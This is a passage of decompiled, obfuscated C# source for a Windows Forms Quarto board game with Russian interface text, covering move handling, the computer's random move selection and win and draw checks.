					continue;
				case 15u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 465586826) ^ -2055648522;
					continue;
				case 14u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)((num2 * 393675101) ^ 0x76B7F9C8);
						continue;
					}
					goto IL_0179;
				case 13u:
					num = (int)((num2 * 1750239814) ^ 0x517F9065);
					continue;
				case 12u:
					num7++;
					num = ((int)num2 * -281305470) ^ -1443999841;
					continue;
				case 11u:
					num = (int)((num2 * 1278524010) ^ 0x75D309CE);
					continue;
				case 9u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 642843459;
						num11 = 642843459;
					}
					else
					{
						num10 = 2129205848;
						num11 = 2129205848;
					}
					num = num10 ^ (int)(num2 * 1692878639);
					continue;
				}
				case 8u:
				{
					int num9;
					if (num7 < 4)
					{
						num = 213838977;
						num9 = 213838977;
					}
					else
					{
						num = 745562402;
						num9 = 745562402;
					}
					continue;
				}
				case 7u:
					num3++;
					num = 1910984532;
					continue;
				case 6u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num3]), num5 * size + 4, num4 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -887919856) ^ -1621460840;
					continue;
				case 5u:
					num = (int)(num2 * 1602209030) ^ -1370423043;
					continue;
				case 4u:
					Paint_Board();
					num = ((int)num2 * -1964304525) ^ 0x45D0D8F2;
					continue;
				case 3u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1939334931) ^ -1658638080;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 211505627) ^ -566059535;
					continue;
				case 1u:
					if (board[num4, num5] == null)
					{
						num = 588903529;
						num6 = 588903529;
						continue;
					}
					goto IL_0179;
				case 0u:
					num3 = 0;
					num = 1811996320;
					continue;
				default:
					return;
				case 10u:
					break;
				case 17u:
					return;
					IL_0179:
					num = 745562402;
					num6 = 745562402;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_05ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_061d: Expected O, but got Unknown
		int num14 = default(int);
		int num17 = default(int);
		int num23 = default(int);
		bool flag3 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		int num19 = default(int);
		int num12 = default(int);
		int num25 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		bool flag10 = default(bool);
		bool flag14 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num8 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num20 = default(int);
		int num18 = default(int);
		bool flag6 = default(bool);
		bool flag15 = default(bool);
		bool flag9 = default(bool);
		bool flag2 = default(bool);
		int num35 = default(int);
		bool flag11 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag7 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag4 = default(bool);
		bool flag16 = default(bool);
		bool flag13 = default(bool);
		bool flag12 = default(bool);
		bool flag = default(bool);
		int num41 = default(int);
		int num21 = default(int);
		int num22 = default(int);
		int num4 = default(int);
		int num6 = default(int);
		bool flag5 = default(bool);
		int num7 = default(int);
		bool flag8 = default(bool);
		while (true)
		{
			int num = 152624870;
			while (true)
			{
				uint num2;
				int num38;
				int num39;
				int num24;
				int num13;
				switch ((num2 = (uint)num ^ 0x1B1DEC37u) % 168u)
				{
				case 167u:
				{
					int num26;
					int num27;
					if (!(Form1.smethod_41((Control)(object)borderBox[num14, num17]) == Color.Red))
					{
						num26 = 1467518528;
						num27 = 1467518528;
					}
					else
					{
						num26 = 1661803684;
						num27 = 1661803684;
					}
					num = num26 ^ ((int)num2 * -438945793);
					continue;
				}
				case 166u:
					num = ((int)num2 * -1899370543) ^ -423326241;
					continue;
				case 165u:
					num = 2112978201;
					continue;
				case 163u:
					num23 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -313239724) ^ -1605999823;
					continue;
				case 162u:
					if (!flag3)
					{
						num = (int)((num2 * 981340450) ^ 0x55ABC641);
						continue;
					}
					num38 = 1;
					goto IL_00a1;
				case 161u:
					num = 1317380749;
					continue;
				case 160u:
					array3[num19, num12] = new Figurine(storage[num23, num25]);
					num = ((int)num2 * -2130653125) ^ -824265414;
					continue;
				case 159u:
					num = ((int)num2 * -353019478) ^ 0xF5175BC;
					continue;
				case 158u:
					Form1.smethod_7((Control)(object)pictureBox[num14, num17], bool_0: false);
					num = 1909984456;
					continue;
				case 157u:
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					num = ((int)num2 * -6350796) ^ 0x57270240;
					continue;
				case 156u:
					Form1.smethod_30((Control)(object)borderBox[num23, num25]);
					num = (int)((num2 * 1287875393) ^ 0x36D74C97);
					continue;
				case 155u:
				{
					int num33;
					int num34;
					if (flag10)
					{
						num33 = -1179528169;
						num34 = -1179528169;
					}
					else
					{
						num33 = -1741447231;
						num34 = -1741447231;
					}
					num = num33 ^ ((int)num2 * -520701262);
					continue;
				}
				case 154u:
				{
					int num69;
					int num70;
					if (!flag14)
					{
						num69 = 1451680441;
						num70 = 1451680441;
					}
					else
					{
						num69 = 1223297469;
						num70 = 1223297469;
					}
					num = num69 ^ (int)(num2 * 1786371410);
					continue;
				}
				case 153u:
					num = ((int)num2 * -509185031) ^ -576812770;
					continue;
				case 152u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num10 * size + 4, num11 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1067081998) ^ -1729753358;
					continue;
				case 151u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1415996112) ^ 0x31CA984B;
					continue;
				case 150u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num20 + 0.05f) * (float)size, ((float)num18 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num20 * size + 4, num18 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1562226747) ^ -489236480;
					continue;
				case 149u:
				{
					int num63;
					int num64;
					if (flag6)
					{
						num63 = -458389135;
						num64 = -458389135;
					}
					else
					{
						num63 = -90178757;
						num64 = -90178757;
					}
					num = num63 ^ (int)(num2 * 193731355);
					continue;
				}
				case 148u:
				{
					int num60;
					if (num3 < 4)
					{
						num = 723596115;
						num60 = 723596115;
					}
					else
					{
						num = 607224025;
						num60 = 607224025;
					}
					continue;
				}
				case 147u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1105431939) ^ -1975577894;
					continue;
				case 146u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 606218217) ^ -1200911428;
					continue;
				case 145u:
				{
					int num54;
					int num55;
					if (flag15)
					{
						num54 = -1570401891;
						num55 = -1570401891;
					}
					else
					{
						num54 = -1566151456;
						num55 = -1566151456;
					}
					num = num54 ^ ((int)num2 * -1147103958);
					continue;
				}
				case 144u:
					num = (int)(num2 * 1741587124) ^ -1489869863;
					continue;
				case 143u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -2005806823) ^ -731078699;
					continue;
				case 142u:
					num = (int)(num2 * 2062234580) ^ -223515169;
					continue;
				case 141u:
					num = (int)(num2 * 1806767326) ^ -246640328;
					continue;
				case 140u:
					num = ((int)num2 * -1531873379) ^ -879819103;
					continue;
				case 139u:
					num = (int)(num2 * 689484455) ^ -1484504704;
					continue;
				case 138u:
					num = ((int)num2 * -1598266263) ^ -138468151;
					continue;
				case 137u:
					num20 = 0;
					num = 418329265;
					continue;
				case 136u:
					num18++;
					num = ((int)num2 * -1435225237) ^ -1956512464;
					continue;
				case 135u:
					flag9 = num18 < 4;
					num = 121497571;
					continue;
				case 134u:
					num = (int)(num2 * 2111664899) ^ -1160245900;
					continue;
				case 133u:
					num = (int)((num2 * 6002461) ^ 0x24FF6915);
					continue;
				case 132u:
					flag2 = num35 < 4;
					num = 769804827;
					continue;
				case 131u:
					flag11 = Standoff(board);
					num = ((int)num2 * -1500983695) ^ -1620772684;
					continue;
				case 130u:
					num = 1452307542;
					continue;
				case 129u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -481953378) ^ 0x3A1915EF;
					continue;
				case 128u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 36585362) ^ -925418655;
					continue;
				case 127u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1004885724) ^ 0x6B3FA6AA);
					continue;
				case 126u:
					num = ((int)num2 * -1326864924) ^ -1769661170;
					continue;
				case 125u:
					num39 = (Standoff(array2) ? 1 : 0);
					goto IL_0573;
				case 124u:
				{
					int num31;
					int num32;
					if (flag9)
					{
						num31 = -999434062;
						num32 = -999434062;
					}
					else
					{
						num31 = -1332128951;
						num32 = -1332128951;
					}
					num = num31 ^ ((int)num2 * -1878331867);
					continue;
				}
				case 123u:
					Form1.smethod_30((Control)(object)borderBox[num3, num5]);
					Form1.smethod_20(pictureBox[num3, num5], (Image)null);
					num = (int)(num2 * 1185112991) ^ -907122481;
					continue;
				case 122u:
					flag7 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num5 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 1014178941;
					continue;
				case 121u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = (int)(num2 * 1966704152) ^ -96093688;
					continue;
				case 120u:
					if (num23 == num8)
					{
						num = ((int)num2 * -532277896) ^ -636508700;
						continue;
					}
					num24 = 0;
					goto IL_0695;
				case 119u:
					num = (int)((num2 * 532713710) ^ 0x4B40EBF5);
					continue;
				case 118u:
					num17++;
					num = 1350100833;
					continue;
				case 117u:
				{
					int num67;
					int num68;
					if (board[num11, num10] == null)
					{
						num67 = 1350141149;
						num68 = 1350141149;
					}
					else
					{
						num67 = 2078802827;
						num68 = 2078802827;
					}
					num = num67 ^ ((int)num2 * -305902393);
					continue;
				}
				case 116u:
					Paint_Board();
					num = (int)(num2 * 669743080) ^ -923754193;
					continue;
				case 115u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -2079362960) ^ -248630074;
					continue;
				case 114u:
					num19++;
					num = (int)(num2 * 1102874417) ^ -469562595;
					continue;
				case 113u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num18, num20] = new Figurine(storage[num8, num9]);
					if (!Stop(array2))
					{
						num = ((int)num2 * -179819875) ^ 0x7E54B3CF;
						continue;
					}
					num39 = 1;
					goto IL_0573;
				case 112u:
				{
					int num65;
					int num66;
					if (!flag4)
					{
						num65 = 1050723584;
						num66 = 1050723584;
					}
					else
					{
						num65 = 1895149917;
						num66 = 1895149917;
					}
					num = num65 ^ (int)(num2 * 917813220);
					continue;
				}
				case 111u:
					num19 = 0;
					num = (int)((num2 * 748301413) ^ 0x311DEC32);
					continue;
				case 110u:
					flag3 = false;
					num = ((int)num2 * -399229664) ^ -668882648;
					continue;
				case 109u:
				{
					int num61;
					int num62;
					if (Stop(array3))
					{
						num61 = -715759344;
						num62 = -715759344;
					}
					else
					{
						num61 = -1720849319;
						num62 = -1720849319;
					}
					num = num61 ^ (int)(num2 * 1202998090);
					continue;
				}
				case 108u:
					Form1.smethod_30((Control)(object)borderBox[num14, num17]);
					num = ((int)num2 * -1271774693) ^ 0x11923085;
					continue;
				case 107u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1982897220) ^ -1752955042;
					continue;
				case 106u:
					flag16 = num20 < 4;
					num = 128853128;
					continue;
				case 105u:
					flag13 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -1824613524) ^ -1954279953;
					continue;
				case 104u:
					num = (int)(num2 * 972429275) ^ -325934714;
					continue;
				case 103u:
				{
					int num58;
					int num59;
					if (!flag16)
					{
						num58 = 588460769;
						num59 = 588460769;
					}
					else
					{
						num58 = 1640885902;
						num59 = 1640885902;
					}
					num = num58 ^ (int)(num2 * 557111618);
					continue;
				}
				case 102u:
					num = ((int)num2 * -1784399538) ^ 0x36D0005B;
					continue;
				case 101u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 863768460) ^ 0x1C0ADE4B);
					continue;
				case 100u:
				{
					int num56;
					int num57;
					if (flag12)
					{
						num56 = 2001049118;
						num57 = 2001049118;
					}
					else
					{
						num56 = 1897555796;
						num57 = 1897555796;
					}
					num = num56 ^ (int)(num2 * 979066389);
					continue;
				}
				case 99u:
					num = (int)(num2 * 1296625880) ^ -966115684;
					continue;
				case 98u:
					num35++;
					num = (int)((num2 * 408855078) ^ 0x2021837);
					continue;
				case 97u:
				{
					int num52;
					int num53;
					if (flag)
					{
						num52 = 1953055493;
						num53 = 1953055493;
					}
					else
					{
						num52 = 428453845;
						num53 = 428453845;
					}
					num = num52 ^ (int)(num2 * 109050672);
					continue;
				}
				case 96u:
					flag14 = num19 < 4;
					num = 576878981;
					continue;
				case 95u:
				{
					int num51;
					if (board[num18, num20] == null)
					{
						num = 1670643058;
						num51 = 1670643058;
					}
					else
					{
						num = 305255148;
						num51 = 305255148;
					}
					continue;
				}
				case 94u:
				{
					int num49;
					int num50;
					if (Form1.smethod_41((Control)(object)borderBox[num3, num5]) == Color.Blue)
					{
						num49 = -2130418436;
						num50 = -2130418436;
					}
					else
					{
						num49 = -1931903313;
						num50 = -1931903313;
					}
					num = num49 ^ ((int)num2 * -1190239741);
					continue;
				}
				case 93u:
					num = ((int)num2 * -1952559218) ^ -1034202632;
					continue;
				case 91u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1476053346) ^ -346618738;
					continue;
				case 90u:
				{
					int num47;
					int num48;
					if (flag7)
					{
						num47 = 608547298;
						num48 = 608547298;
					}
					else
					{
						num47 = 1771591354;
						num48 = 1771591354;
					}
					num = num47 ^ ((int)num2 * -1165754069);
					continue;
				}
				case 89u:
					num = (int)((num2 * 1747818897) ^ 0x140AD22A);
					continue;
				case 88u:
					num41++;
					num = 282445529;
					continue;
				case 87u:
					Form1.smethod_15(timer1);
					num = 33763988;
					continue;
				case 86u:
					board[num11, num10] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					Form1.smethod_5((Control)(object)borderBox[num23, num25], Color.Blue);
					num = ((int)num2 * -429639540) ^ 0x7FBC523C;
					continue;
				case 85u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1446348564) ^ -27577994;
					continue;
				case 84u:
					num = ((int)num2 * -1274838258) ^ -1239632098;
					continue;
				case 83u:
					num = (int)(num2 * 1463420491) ^ -866012494;
					continue;
				case 82u:
					num38 = ((num41 < 9) ? 1 : 0);
					goto IL_00a1;
				case 81u:
					num = ((int)num2 * -1899619916) ^ 0x49253149;
					continue;
				case 80u:
					num = ((int)num2 * -1590796708) ^ 0x6FA3C761;
					continue;
				case 79u:
					num11 = Form1.smethod_33(rnd, 4);
					num = 1683925267;
					continue;
				case 78u:
				{
					int num46;
					if (num17 >= 4)
					{
						num = 1751169661;
						num46 = 1751169661;
					}
					else
					{
						num = 1818443977;
						num46 = 1818443977;
					}
					continue;
				}
				case 77u:
					num = (int)(num2 * 1619174402) ^ -1293556033;
					continue;
				case 76u:
				{
					int num44;
					int num45;
					if (!flag13)
					{
						num44 = -952402848;
						num45 = -952402848;
					}
					else
					{
						num44 = -423206636;
						num45 = -423206636;
					}
					num = num44 ^ ((int)num2 * -1644863054);
					continue;
				}
				case 75u:
					num = ((int)num2 * -1895423522) ^ -99453183;
					continue;
				case 74u:
					num21 = num3;
					num22 = num5;
					num = ((int)num2 * -207942486) ^ 0x15C700E6;
					continue;
				case 73u:
					num4 = 0;
					num6 = 0;
					num = ((int)num2 * -1903588342) ^ -2042240767;
					continue;
				case 72u:
				{
					int num42;
					int num43;
					if (flag5)
					{
						num42 = -1716114367;
						num43 = -1716114367;
					}
					else
					{
						num42 = -2092719422;
						num43 = -2092719422;
					}
					num = num42 ^ ((int)num2 * -1813037441);
					continue;
				}
				case 71u:
					num3++;
					num = ((int)num2 * -745173583) ^ -1649136620;
					continue;
				case 70u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = (int)(num2 * 1676162563) ^ -877523877;
					continue;
				case 69u:
					num7 = 0;
					num = 618445816;
					continue;
				case 68u:
					num5 = 0;
					num = 702364121;
					continue;
				case 67u:
					num20++;
					num = 438522557;
					continue;
				case 66u:
					num41 = 0;
					num = (int)(num2 * 1533940878) ^ -1174470597;
					continue;
				case 65u:
					array[num11, num10] = new Figurine(storage[num8, num9]);
					num = ((int)num2 * -497944109) ^ 0x3D479FB3;
					continue;
				case 64u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 1757237789) ^ -1536129924;
					continue;
				case 63u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1479038419;
					continue;
				case 62u:
					num12 = 0;
					num = 1058790327;
					continue;
				case 61u:
					num = ((int)num2 * -1556980535) ^ -1696209986;
					continue;
				case 60u:
					num21 = 0;
					num22 = 0;
					num = (int)((num2 * 774880613) ^ 0x2800E37A);
					continue;
				case 59u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = ((int)num2 * -1629512636) ^ 0x2CC3AEB8;
					continue;
				case 58u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1694113450) ^ 0x1102453D;
					continue;
				case 57u:
					num = (int)(num2 * 320520969) ^ -1247365518;
					continue;
				case 56u:
					num = ((int)num2 * -299165982) ^ 0x73F76BD2;
					continue;
				case 55u:
				{
					int num40;
					if (num7 < 4)
					{
						num = 1547426740;
						num40 = 1547426740;
					}
					else
					{
						num = 1572098565;
						num40 = 1572098565;
					}
					continue;
				}
				case 54u:
					flag12 = num5 < 4;
					num = 1095431899;
					continue;
				case 53u:
					num = (int)((num2 * 672209218) ^ 0x1DB3CC13);
					continue;
				case 52u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 212996961) ^ -1439040437;
					continue;
				case 51u:
					flag8 = num14 < 4;
					num = 906029808;
					continue;
				case 50u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array);
					num = ((int)num2 * -13024725) ^ -1028929703;
					continue;
				case 49u:
					num3 = 0;
					num = (int)(num2 * 1517789046) ^ -272363232;
					continue;
				case 48u:
				{
					int num36;
					int num37;
					if (flag11)
					{
						num36 = 503392464;
						num37 = 503392464;
					}
					else
					{
						num36 = 327770266;
						num37 = 327770266;
					}
					num = num36 ^ (int)(num2 * 687443139);
					continue;
				}
				case 47u:
					num12++;
					num = 45901273;
					continue;
				case 46u:
					num = (int)((num2 * 691385335) ^ 0x328937F7);
					continue;
				case 45u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1108266440;
					continue;
				case 44u:
					num = 774486656;
					continue;
				case 43u:
					Form1.smethod_7((Control)(object)pictureBox[num35, num7], bool_0: true);
					num = 788339742;
					continue;
				case 42u:
					num25 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1322327464) ^ -649182477;
					continue;
				case 41u:
					num = (int)((num2 * 1140847730) ^ 0x23A9BE69);
					continue;
				case 40u:
					num35 = 0;
					num = ((int)num2 * -666015411) ^ 0x1134A66;
					continue;
				case 39u:
				{
					int num29;
					int num30;
					if (flag8)
					{
						num29 = 295940328;
						num30 = 295940328;
					}
					else
					{
						num29 = 222872903;
						num30 = 222872903;
					}
					num = num29 ^ ((int)num2 * -1996920787);
					continue;
				}
				case 38u:
					num8 = num14;
					num9 = num17;
					num = (int)(num2 * 1107254885) ^ -2082033401;
					continue;
				case 37u:
				{
					int num28;
					if (Standoff(board))
					{
						num = 519723228;
						num28 = 519723228;
					}
					else
					{
						num = 100856853;
						num28 = 100856853;
					}
					continue;
				}
				case 36u:
					if (storage[num23, num25] != null)
					{
						num = ((int)num2 * -292195520) ^ -1410710921;
						continue;
					}
					num24 = 1;
					goto IL_0695;
				case 35u:
					num24 = ((num25 == num9) ? 1 : 0);
					goto IL_0695;
				case 34u:
					num14++;
					num = ((int)num2 * -1556672198) ^ 0x12875268;
					continue;
				case 33u:
					num = 1870370044;
					continue;
				case 32u:
					if (!Stop(board))
					{
						num = (int)((num2 * 1562540695) ^ 0x65DDFB3E);
						continue;
					}
					num13 = 0;
					goto IL_1097;
				case 31u:
					num = ((int)num2 * -1359119632) ^ 0x66CFB440;
					continue;
				case 30u:
					board[num21, num22] = new Figurine(storage[num4, num6]);
					storage[num4, num6] = null;
					num = (int)(num2 * 1365703977) ^ -2064913259;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num5]);
					num = ((int)num2 * -1281220584) ^ 0x63123ED8;
					continue;
				case 28u:
					num17 = 0;
					num = 1350100833;
					continue;
				case 27u:
					board[num18, num20] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					num = ((int)num2 * -713565969) ^ -94896455;
					continue;
				case 26u:
					flag4 = array[num19, num12] == null;
					num = 1603353303;
					continue;
				case 25u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1556804157) ^ -516008805;
					continue;
				case 24u:
					num18 = 0;
					num = (int)((num2 * 311861355) ^ 0x742DE918);
					continue;
				case 23u:
					num = (int)((num2 * 1863807294) ^ 0xE3954EE);
					continue;
				case 22u:
					num = (int)((num2 * 857715064) ^ 0x3198E486);
					continue;
				case 21u:
					flag3 = true;
					num = ((int)num2 * -1088983646) ^ -4024911;
					continue;
				case 20u:
					num10 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 613851447) ^ 0x2533233B);
					continue;
				case 19u:
					num = ((int)num2 * -1361799257) ^ -11101112;
					continue;
				case 18u:
					num = (int)((num2 * 1422701202) ^ 0x2267236E);
					continue;
				case 17u:
					num = ((int)num2 * -1647573243) ^ -2027035179;
					continue;
				case 16u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = ((int)num2 * -1754431160) ^ -1668747764;
					continue;
				case 15u:
					num = ((int)num2 * -1166950499) ^ -422004028;
					continue;
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 591857008) ^ -691420362;
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num14, num17], Color.LimeGreen);
					num = (int)(num2 * 835053039) ^ -383658992;
					continue;
				case 12u:
				{
					int num15;
					int num16;
					if (flag2)
					{
						num15 = -799973002;
						num16 = -799973002;
					}
					else
					{
						num15 = -1625323277;
						num16 = -1625323277;
					}
					num = num15 ^ (int)(num2 * 1153854849);
					continue;
				}
				case 11u:
					num5++;
					num = 702364121;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)label2);
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num8 = 0;
					num9 = 0;
					num14 = 0;
					num = (int)(num2 * 1616515458) ^ -1478306676;
					continue;
				case 9u:
					num13 = ((!Standoff(board)) ? 1 : 0);
					goto IL_1097;
				case 8u:
					num = 305255148;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 252157454) ^ 0x66DC03E2);
					continue;
				case 6u:
					flag = num12 < 4;
					num = 747596598;
					continue;
				case 5u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num11 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1598645161) ^ 0xF82FF0A);
					continue;
				case 4u:
					num = (int)(num2 * 998761598) ^ -167211856;
					continue;
				case 3u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = ((int)num2 * -382793617) ^ 0x124BFFFA;
					continue;
				case 2u:
					num7++;
					num = (int)(num2 * 869082031) ^ -1815216538;
					continue;
				case 1u:
					step++;
					num = (int)(num2 * 1486851793) ^ -277293335;
					continue;
				case 0u:
					num4 = num3;
					num6 = num5;
					num = ((int)num2 * -1438700235) ^ -520715566;
					continue;
				default:
					return;
				case 92u:
					break;
				case 164u:
					return;
					IL_1097:
					flag5 = (byte)num13 != 0;
					num = 954587167;
					continue;
					IL_0695:
					flag6 = (byte)num24 != 0;
					num = 519878762;
					continue;
					IL_0573:
					flag10 = (byte)num39 != 0;
					num = 409488572;
					continue;
					IL_00a1:
					flag15 = (byte)num38 != 0;
					num = 541477862;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num = 0;
		bool result = default(bool);
		bool flag4 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			bool flag2 = num < 4;
			int num2 = 1849495357;
			while (true)
			{
				uint num3;
				int num10;
				int num11;
				switch ((num3 = (uint)num2 ^ 0x44937026u) % 77u)
				{
				case 75u:
					if (mem[0, num].Square == mem[1, num].Square)
					{
						num2 = 1475444130;
						continue;
					}
					goto IL_002f;
				case 74u:
					flag = true;
					num2 = ((int)num3 * -1549189366) ^ -1637680303;
					continue;
				case 73u:
					result = flag;
					num2 = 545382088;
					continue;
				case 72u:
					flag = true;
					num2 = (int)(num3 * 130434004) ^ -1080858878;
					continue;
				case 71u:
				{
					int num64;
					int num65;
					if (mem[num, 1].Big != mem[num, 2].Big)
					{
						num64 = 465930589;
						num65 = 465930589;
					}
					else
					{
						num64 = 742576594;
						num65 = 742576594;
					}
					num2 = num64 ^ ((int)num3 * -394547333);
					continue;
				}
				case 70u:
					if (mem[1, num].Square == mem[2, num].Square)
					{
						num2 = (int)((num3 * 80698593) ^ 0x3E8AC124);
						continue;
					}
					goto IL_002f;
				case 69u:
					num2 = ((int)num3 * -2129130430) ^ 0x62E5609A;
					continue;
				case 68u:
				{
					int num22;
					int num23;
					if (mem[num, 1].Square == mem[num, 2].Square)
					{
						num22 = -944570790;
						num23 = -944570790;
					}
					else
					{
						num22 = -1851006340;
						num23 = -1851006340;
					}
					num2 = num22 ^ ((int)num3 * -1499556714);
					continue;
				}
				case 67u:
					if (mem[1, 2] != null)
					{
						num2 = (int)(num3 * 907965029) ^ -1079241511;
						continue;
					}
					goto IL_0156;
				case 66u:
				{
					int num66;
					int num67;
					if (mem[0, num].Big == mem[1, num].Big)
					{
						num66 = 1912097776;
						num67 = 1912097776;
					}
					else
					{
						num66 = 804674309;
						num67 = 804674309;
					}
					num2 = num66 ^ (int)(num3 * 1171306154);
					continue;
				}
				case 65u:
				{
					int num46;
					int num47;
					if (mem[num, 2] == null)
					{
						num46 = -1632154512;
						num47 = -1632154512;
					}
					else
					{
						num46 = -628314383;
						num47 = -628314383;
					}
					num2 = num46 ^ ((int)num3 * -728294305);
					continue;
				}
				case 64u:
					if (mem[3, num] != null)
					{
						num2 = (int)(num3 * 1647813370) ^ -1526548172;
						continue;
					}
					goto IL_01f0;
				case 63u:
					if (mem[num, 2].Dark != mem[num, 3].Dark)
					{
						num2 = ((int)num3 * -1925484665) ^ -1441309045;
						continue;
					}
					goto IL_0225;
				case 62u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num2 = 1154566501;
						continue;
					}
					goto IL_0251;
				case 61u:
					if (mem[2, num].Dark != mem[3, num].Dark)
					{
						num2 = ((int)num3 * -2063520567) ^ 0x3AAA26CB;
						continue;
					}
					goto IL_0286;
				case 60u:
				{
					int num5;
					if (mem[num, 0].Square != mem[num, 1].Square)
					{
						num2 = 1309168914;
						num5 = 1309168914;
					}
					else
					{
						num2 = 390619363;
						num5 = 390619363;
					}
					continue;
				}
				case 59u:
					if (mem[num, 2].Square != mem[num, 3].Square)
					{
						num2 = (int)((num3 * 55820982) ^ 0x64A263DE);
						continue;
					}
					goto IL_0225;
				case 58u:
					if (mem[1, num] != null)
					{
						num2 = (int)(num3 * 1865741270) ^ -561085536;
						continue;
					}
					goto IL_01f0;
				case 57u:
				{
					int num60;
					int num61;
					if (mem[num, 1].Dark != mem[num, 2].Dark)
					{
						num60 = -2112348345;
						num61 = -2112348345;
					}
					else
					{
						num60 = -1438434510;
						num61 = -1438434510;
					}
					num2 = num60 ^ (int)(num3 * 1362609816);
					continue;
				}
				case 56u:
				{
					int num51;
					int num52;
					if (mem[1, num].Dark != mem[2, num].Dark)
					{
						num51 = -1009301229;
						num52 = -1009301229;
					}
					else
					{
						num51 = -545483890;
						num52 = -545483890;
					}
					num2 = num51 ^ ((int)num3 * -1527728033);
					continue;
				}
				case 55u:
				{
					int num40;
					int num41;
					if (mem[0, 0] != null)
					{
						num40 = -803980209;
						num41 = -803980209;
					}
					else
					{
						num40 = -1967401855;
						num41 = -1967401855;
					}
					num2 = num40 ^ ((int)num3 * -418390732);
					continue;
